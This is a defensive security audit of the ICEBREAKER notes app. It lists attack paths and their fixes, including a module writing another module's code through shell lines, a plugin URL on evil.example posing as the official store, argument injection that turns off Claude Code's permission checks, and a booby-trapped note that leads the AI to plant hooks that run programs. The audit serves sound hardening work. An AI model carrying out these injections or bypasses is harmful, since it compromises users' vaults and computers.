# Security audit — findings (2026-11-20)

Hands-on passes ("pentest it like a brute"): what a hostile module, a program in
your terminal, a stolen laptop, a USB key or a curious person at the deck could do.
Each finding: what, how bad, and where it stands. The first pass (1–13) came with the
big cleanup; the security pass (14–24) fixed most of what was left open; 25–31 came with
the updates and the check before going public; **32–58 come from a full review of the
code by another AI (2026-11-20), which found that several of the earlier fixes could be
walked around** — they're listed with what they walked around. **Nobody outside the project has audited
ICEBREAKER** — read [../DISCLAIMER.md](../DISCLAIMER.md).

Severity: 🔴 critical (your notes, keys or computer) · 🟠 high · 🟡 medium · ⚪ low.

## Found and fixed

| # | what | how bad | fix |
|---|---|---|---|
| 1 | A module's code ran in the deck's own JavaScript: it could call **any native command** — `fs_read_text` reads any file of the computer (≤2 MB: `~/.ssh`, browser profiles…), `net_get` sends it out, `vault_decrypt`… | 🔴 | **The sandbox**: modules from the STORE and the vault run in a Worker without the native bridge, the page or the network (docs/SANDBOX.md). Tested with a module written to escape. |
| 2 | `ib.shell.run("script x")` runs a `.sh` / `.py`… in **your real terminal**: a module with `vault:write` writes the script, then runs it — any program on your computer | 🔴 | `script` is refused to modules (`src/shell/privileged.ts`) |
| 3 | A module could run `vault decrypt / export / encrypt / recovery / mount / move`, `account`, `self-destruct` | 🔴 | refused to modules; each also asks your password or confirmation (`self-destruct` itself was removed in 0.5.2) |
| 4 | A module could **plant a trap**: `bind <key> factory-reset --yes`, a macro button, `config set keys.*` — your next key press runs it as you | 🟠 | `bind`, `unbind`, `macro add / rm`, `config set keys / menu / shell / privacy / plugins / ai` refused to modules |
| 5 | A module could register a command named `vault` (or replace the Settings page, a THE MENU action): a fake one asks for your password | 🟠 | the deck's sensitive names are refused; a STORE / vault module can't replace any of the deck's commands, pages or actions |
| 6 | `ib.vault.read(".icebreaker/secrets.json")` (your API key, inside an encrypted vault) and `account.json` (your password's hash); `ib.vault.write(".icebreaker/settings.json")` plants settings another computer adopts | 🔴 | the native side refuses these files to the UI, modules, ibsh and the AI — only Rust reads them |
| 7 | A module with `vault:write` could rewrite **another module's code** (`.icebreaker/plugins/`) | 🟠 | `ib.vault` writes never touch `.icebreaker/`; the AI's `write_note` neither |
| 8 | `factory-reset --yes` (a developer command still shipped) from a module: your vault and accounts moved aside | 🟠 | refused to modules (and see open #O1) |
| 9 | Claude Code (UPLINK) could read `.icebreaker/` in a plain vault (the account's hash, settings) | 🟡 | `Read(./.icebreaker/**)` disallowed; an encrypted vault gives it no disk at all |
| 10 | A click area of a module with a `cmd` ran it **as you** (a click looks like yours) | 🟠 | from a sandboxed module, it runs as the module (untrusted) |
| 11 | The boot error screen put the error text in the page as HTML (it may quote a file) | ⚪ | text only |
| 12 | Settings from a newer ICEBREAKER (or a hand-edited file) could crash the deck (a value of an unexpected kind) | 🟡 | a value of another kind keeps the default |
| 13 | A vault written by a newer ICEBREAKER could be "repaired" (rebuilt) by an older one | 🟠 | refused, never touched |
| 14 | **Any program in your real terminal** inherits the bridge's token (`ICEBREAKER_TOKEN`, so `ib vault decrypt` works from the system terminal): a script you run, or a package's install script, could ask the deck to decrypt, export or change your vault | 🔴 | while the vault is encrypted the bridge refuses everything; a plain vault's bridge runs as **untrusted** (the same list a module gets: no `vault encrypt/decrypt/export…`, `account`, `script`, `bind`…). The token is compared in constant time |
| 15 | `secrets.json` (API key), `google.json` (Google sign-in), `config.json`, `accounts.json` and `vault.key` were written with the default permissions (readable by the computer's other users) | 🟠 | written `0600` from their creation (`crypto::write_private`: no moment where they're readable) |
| 16 | The voice (dictation) wrote its sound and its text in `/tmp` with a guessable name: another user could plant a link there (the text written over any of your files) or read what you said | 🟠 | in the app's own cache folder (`0700`), a random name, the text `0600` |
| 17 | `net_get` (the STORE, news, weather) followed redirects to anything: `file://`, `http://localhost`, other schemes — an index could point it at your computer's own services | 🟠 | https / http only, redirects only to https, 5 at most, 4 MB, 30 s |
| 18 | `fs_read_text` (the file browser, scripts) read **any file** of the computer up to 2 MB | 🟠 | only text and script files (`.md .txt .sh .py .js…`), never hidden folders, `..`, the system's folders or `~/Library` / `AppData` |
| 19 | `factory-reset` (a developer tool still shipped) moved your vault and accounts aside on one word | 🟠 | asks the account's password first (checked by Rust) — was open #O1 |
| 20 | The account's password hash used Argon2id at 19 MiB: whoever copies a **plain** vault (`.icebreaker/account.json`) tries passwords faster | 🟡 | 64 MiB, 3 passes (like the vault key); an old hash is redone at the next login — was #O8 |
| 21 | The login's slow-down after wrong passwords reset when the app quit | ⚪ | kept in the config folder — was #O9 |
| 22 | The shell history (in the vault) kept every line, a secret typed as an argument too | ⚪ | a line that starts with a space, or looks like a key (`sk-…`, `ghp_…`, `AKIA…`, a JWT, `password=…`), isn't kept — was #O10 |
| 23 | "copy all" put the 24 words in the clipboard without a word: a clipboard history (or Universal Clipboard) keeps them | 🟡 | the first click warns, the second copies (the clipboard is still cleared after a minute) — was #O6 |
| 24 | The vault key never changed: an **old** `vault.key` and the **old** password still opened today's vault | 🟡 | `vault rekey` (Settings → PRIVACY → Vault key): a new vault key, every file encrypted again and checked before anything is swapped, a new recovery key; an interrupted rekey leaves the vault as it was — was #O7 |
| 25 | Updates: a module could download / install updates, change where ICEBREAKER's come from (`config set updates.endpoint`) or install a module | 🟠 | `update` (but looking), `store install / remove / update / sources` and `config set updates.*` refused to modules; ICEBREAKER's updates are **signed** (the public key in tauri.conf.json): an unsigned or tampered one is refused by the native side, whatever the address |
| 26 | A module's `plugin.json` could name its code file `"main": "../../notes/x.md"`: installing it wrote that file **anywhere in the vault** | 🟠 | `main` must be a plain file name (`main.js`), checked when installing and when loading |
| 27 | Text read aloud starting with `--` reached the neural voice engine as an **option** (`--output-filename=…` could write a file anywhere); a voice name could be a path | 🟡 | such text can't start with `-` any more; a voice is a name, never a path |
| 28 | A Claude Code model or session id starting with `-` became an **option** of Claude Code (`--dangerously-skip-permissions` would switch its checks off) | 🟠 | both must be plain names (letters, digits, `.` `_` `:` `-`, not first) |
| 29 | Developer tools (`factory-reset`, the dev restart) were in every build | ⚪ | only in builds made with `--features dev-tools` (`npm run app:mac`, for testing); a release doesn't register `factory-reset` at all (not in help, man, Tab, THE MENU) and the native side still answers "not in this build" — was #O14 |
| 30 | The published app allowed a websocket to `localhost:1420` (the dev server) | ⚪ | only in development (`devCsp`) |
| 31 | The Google agenda cache was readable by other users for an instant (written, then chmod) | ⚪ | written `0600` from the start |
| 32 | **The sandbox had a side door**: `ib.modules.call("shell", "run", "<any command>")` — and `keys.bind`, `menu.add`, `home.link` — ran **as you**, for a module with no permission at all. With a script written first (#33), that's any program on your computer. It undid #2, #3, #4, #8 and #25 | 🔴 | a function a module calls runs **as that module**: its line carries its origin for its whole run (`src/shell/origin.ts`), privileged commands refused; what such functions build is quoted (a `;` in an argument starts nothing). The built-in modules' functions ask for a permission (`todo.list`: `vault:read`, `calendar.today`: `google-calendar`…) |
| 33 | **The `vault:read` / `vault:write` permissions meant nothing in the shell**: `ib.shell.run("cat note.md \| mycommand")` read any note, `ib.shell.run("echo … > .icebreaker/plugins/other/main.js")` rewrote another module's code (it undid #7) | 🔴 | a module's line reads, pipes and `<` only with `vault:read`, writes (`>`, `touch`, `mv`, `rm`, `note`…) only with `vault:write`, never reads or writes `.icebreaker/`, and can't `ask` without `ai` — in the shell exactly as through `ib.vault` |
| 34 | In the shell, `modules call`, `menu add` (= `bind`), `keys set`, `home link`, `pin`, `macro run`, `config set vault.path / home.links / favorites…`, `plugin disable`, `exit`… weren't on the refused list | 🟠 | the list is now "what's allowed" for the sensitive commands (`src/shell/privileged.ts`), read the two ways a command can read its words (a flag in front changes nothing) |
| 35 | "Untrusted" was **one flag on the shared shell**: a second module line finishing switched it off under the first one still running | 🟠 | no flag any more: each line carries its own origin |
| 36 | **Capitals walked around the protected files** on a Mac or on Windows (one folder for `.ICEBREAKER` and `.icebreaker`): `.ICEBREAKER/account.json` gave the password's hash, `.ICEBREAKER/settings.json` could be written; also `account.json.`, `account.json::$DATA`, short names (`ACCOUN~1.JSO`), invisible characters. It undid #6 | 🟠 | names are compared the way disks read them (`store::fold`), and in a plain vault the real file on the disk is checked too (a link inside the vault that leads there) |
| 37 | **A plain vault could change your password and your settings**: with settings that looked newer, its card's hash replaced this computer's and its settings (keys, macros, the module list…) were taken without a word — a sync, a shared USB key or #36 was enough | 🟠 | from a plain vault: never a password or a name, never the settings that hold commands or decide what runs, and the rest only after you say yes. An encrypted vault brings everything (only its password writes in it) |
| 38 | "Open a vault" skipped the approval when the vault's card carried the **uid of an account of this deck**: a vault made by someone else took that account over | 🟠 | such a vault is that account's only if its password already is, or it's the vault that account uses; else an account of the deck approves, as for a new one |
| 39 | **A module's update could ask for more permissions** (`terminal`: your real terminal) and get them silently — by itself with "install by itself" | 🟠 | the permissions you approved are kept (`plugins.granted`); a module that asks for more stays off until you switch it on again and read them |
| 40 | Claude Code runs without its "do you trust this folder?" question, and a vault can come from anywhere: a `.claude/settings.json` in the vault (planted, or written by the model itself after reading a booby-trapped note) could **run programs** (hooks) | 🟠 | only your own Claude Code settings are loaded (`--setting-sources user`, `--strict-mcp-config`), and the model can't write `.claude/`, `CLAUDE.md` or `.mcp.json` |
| 41 | The macOS release was to be made from the testing build (`npm run app:mac`), **with the developer tools** — against #29 | 🟠 | `npm run app:mac:release`; `scripts/release-update.mjs` refuses a build that carries them |
| 42 | `voice install` downloaded a program and ran it without checking it | 🟡 | each download must have the SHA-256 written in the code, else it's deleted unopened |
| 43 | A module from the vault could take the **id of a built-in one** (its data, its stats, and it passed for the deck's own); its id wasn't checked against its folder (the audit read another folder) | 🟡 | an id is the folder's name, lowercase letters, digits and dashes, never a built-in's; a module can't take another module's commands, pages or actions |
| 44 | Asking the vault's status during `vault rekey` could delete the half-built new store — and, at the worst moment, files of the new one | 🟡 | asking never touches the disk; an interrupted rekey is put right when the vault is mounted |
| 45 | A window or a question opened by a module didn't say who was asking (it could ask "your password") | 🟡 | they're headed "<module> (module) — …", `[module]` in the shell |
| 46 | `plugin install https://evil.example/github.com/kiddoko/icebreaker-modules/` passed for the official STORE (no warning) | 🟡 | decided on the address the download uses |
| 47 | `vault export` and self-destruct checked your password in the interface only | ⚪ | checked by the native side (self-destruct was removed in 0.5.2: no command deletes the vault any more) |
| 48 | The plain backup zip of `vault encrypt` and some settings files were readable by the computer's other users | ⚪ | `0600` from the first byte |
| 49 | `net_get` took `http://10.0.0.1@evil.example` or `127.evil.example` for your local network; your `~/.curlrc` applied; `{a,b}` in an address was expanded | ⚪ | the host is read as curl reads it, a local address is four numbers; `-q -g` |
| 50 | The Google sign-in's `state` was a piece of its PKCE secret; a calendar request's body starting with `@` would have sent a file | ⚪ | its own random value; JSON only |
| 51 | A module's click areas could reach outside its rectangle (over the deck's buttons); its frames' sizes weren't checked; it could flood the log | ⚪ | clamped, checked, capped |
| 52 | The AI's `write_note` showed 12 lines of what you approve; `read_note` could read `.icebreaker/` | ⚪ | says how much more there is; refused |
| 53 | In a **plain** vault, anything that can write in the folder could change the code of a module you had switched on; and a vault from someone else holding a module **of the same name** as one you approved ran without a word (was open #O16) | 🟡 | your approval is for that code: its fingerprint (SHA-256) is kept (`plugins.pinned`); changed since — or never approved on this deck — the module stays off until you switch it on again. `plugin reload` and an update you accept approve the new code; switching a module off forgets its approvals |
| 54 | Settings took any value: a text size of 0, an interface at 1 000 000 %, a journal folder `../..`, a whole section replaced by a word — a deck nobody can use until the file is fixed by hand (a module could do it: `appearance.*` isn't refused) | 🟡 | every number stays in its range, every choice is one of its words, names hold no control characters — on `config set`, and when a file or a vault brings them (`core/settings.ts` limitSetting) |
| 55 | A new file could be named with escape sequences or characters that reverse the reading direction ("gnp.exe" shown backwards) | ⚪ | refused for new names (existing files are still read, moved, trashed) |
| 56 | A vault's newer settings were "newer" again at every start when the other computer's clock was ahead (an endless reload for an encrypted vault) | 🟡 | what's taken is stamped no older than the vault's own |
| 57 | Mounting an encrypted vault the login's password didn't open left an empty deck with the other vault's tree | ⚪ | its password is asked for, in a window |
| 58 | The account's card in a plain vault (its password's hash) was readable by the computer's other users | ⚪ | `0600` |
| 59 | CI: the GitHub Actions were named by version (a tag can be moved to other code), not by commit (was open #O20) | ⚪ | every third-party action is pinned to a commit SHA, its version in a comment (`.github/workflows/build.yml`, 0.5.2) |

## Open — for the security pass

| # | what | how bad | idea |
|---|---|---|---|
| O2 | **Any code in the page** can still call every native command (`fs_list`, `vault_*`… — `fs_read_text` and `net_get` are narrowed, #17–18). Only the deck's own code and the built-in modules run there now, and the deck never renders notes as HTML (a grid of cells), so there's no known way in — but nothing *locks* it | 🟠 | lock the bridge: the deck keeps the only handle (sandbox step 2), and `fs_read_text` only for a file you just chose in the file browser; `net_get` only for the STORE's sources |
| O3 | The built-in modules (TODO, CALENDAR, MUSIC…) still run in the deck | 🟡 | move them into the Worker one by one (docs/SANDBOX.md) |
| O4 | The CSP allows `blob:` scripts in the page (for modules that ran there) and `'unsafe-inline'` styles | 🟡 | once every module is in a Worker: no `blob:` in `script-src` (only `worker-src blob:`) |
| O5 | Passwords and recovery words pass through the UI's JavaScript: strings can't be wiped from memory (Rust zeroizes its copies) | ⚪ | accept and document; keep them out of logs (they are) |
| O11 | Sync (iCloud, Syncthing) of an encrypted vault from two computers at once: the one index can conflict (no note lost, but some back in `.trash/recovered-…`) | 🟡 | a per-device journal of index changes merged on open |
| O12 | The login page's file browser (open a vault) lists the computer's folders before anyone is logged in | ⚪ | by design (the person at the keyboard has the computer); only folders, no file content |
| O15 | The bridge from your terminal keeps working for a **plain** vault (untrusted): a program you run can still read and write your notes through it — as it can on the disk anyway | ⚪ | by design (a plain vault is plain files); an option to switch the bridge off |
| O17 | The built-in modules and the deck's own functions trust their callers' words: a function exposed tomorrow that builds a command from an argument without quoting it would reopen #32 for that function | 🟡 | `tests/origin.test.ts` guards the mechanism; each new function must use `line(…)` (plugins/frame-services.ts) |
| O18 | The neural voice takes its text as an argument: while it speaks, other users of the computer can see that text in the list of processes | ⚪ | the engine has no other way in; the system voices read a private file |
| O19 | Windows: the deck's terminals start PowerShell with `-ExecutionPolicy Bypass` (needed to load its hook) | ⚪ | sign the hook, or load it another way |
| O20 | CI: the updater key has no password (the actions are pinned now: #59) | ⚪ | a key with a password in the secret |
| O13 | The audit (`plugin audit`) reads the code before it runs; a minified or obfuscated module can hide what it does | ⚪ | with the sandbox it matters much less; keep showing "minified" in red |
| O21 | A module with `audio` can play any sound, inaudible ones too (an ultrasound "beacon" some trackers use to link devices) | ⚪ | the permission says it plays sound; ♪ its name in the status bar while it plays, one click silences it; idea: a low-pass on the modules' channel |

## Looked at, nothing found

- **Google sign-in**: PKCE and a random `state`, the answer only on `127.0.0.1`, the
  token in `google.json` in the app's configuration folder (`0600`). It never goes into
  the vault — so it doesn't travel with it, and it isn't encrypted by the vault's key.
- **Media and voice**: the programs (`afplay`, `say`, `whisper`…) get their arguments as
  a list, never through a shell — a note's name can't become a command.
- **`open_url`**: only `https`.
- **The vault's paths**: `..`, absolute paths and links that lead out are refused (already
  tested in the first pass, again here with names in NFD and odd Unicode).
- **The encryption itself** (2026-11-20 review): the file format and what it authenticates,
  the key file and its cost limits, atomic writes, the recovery words, the order of
  `vault encrypt / decrypt / adopt / move` (backup and read-back before anything is removed).
- **The Worker's walls**: no `fetch`, XHR, WebSocket, nested Worker, native bridge or code
  from the network; what's left obeys the page's Content-Security-Policy.
- **Stealth mode**: every way out of the deck goes through its guard.
- **Sound and binary files from the sandbox** (2026-11-20, for a tracker module): `ib.audio`
  needs the `audio` permission and plays only (no microphone, no recording); a module reaches only its
  own samples and voices (the deck numbers them, the module never names another's), within limits (64
  voices, 32 MB, 30 s ahead, 8192 events a call), and is silenced when it's switched off.
  `vault.readBytes / writeBytes` follow `vault:read` / `vault:write`, never `.icebreaker/`, 256 MB at
  most; the native `vault_write_bytes` goes through the same path guard and atomic write as
  `vault_write` (`../` stops at the vault's root). `sbx-evil` and `sbx-bare` try them: closed.
  `ib.audio.stream()` (a module computing its own sound): one MessagePort to its own AudioWorklet
  node, only with `audio`; the node reads blocks of frames and nothing else (types, sizes, values
  checked, two seconds at most queued), its output goes through the "Modules" fader; `audio stop`
  flushes it.
- **ICEBREAKER's own updates**: signature checked before installing, https only.

## How to repeat the test

`tests/sandbox/sbx-evil/` is the module that tries every way out (it has `vault:read`
and `vault:write`), `tests/sandbox/sbx-bare/` the one with **no permission at all** (it
must read and write nothing), `tests/sandbox/sbx-demo/` the one that uses the API
normally. Copy the three into a **test** vault's `.icebreaker/plugins/`, `plugin enable`
them, run `sbxevil` and `sbxbare` (every line must say "closed", and `sbxbare` must end
with "captured nothing"; "take the vault command" shows its refusal in the LOG tab) and
`sbxdemo` / `launch sbx`; `tests/sandbox/sbx-audio/` (`sbxaudio`: a little tune twice, smooth then
stepped, a binary file written and read back, a WAV decoded, the limits refused). `tests/origin.test.ts` and `tests/privileged.test.ts` check the
same rules without the app. Run on 2026-11-20 in the macOS app (WKWebView) and in a
Chromium browser (the web version): every door closed. Also checked that day, for real: a
hook planted in a vault's `.claude/settings.json` runs with plain `claude -p` and does
**not** run from ICEBREAKER; a plain vault with a forged card and booby-trapped settings
changed nothing but the theme, after a yes; `vault export` with a wrong password writes
nothing; 2 000 notes and a 3 MB note keep the deck above 90 frames a second.
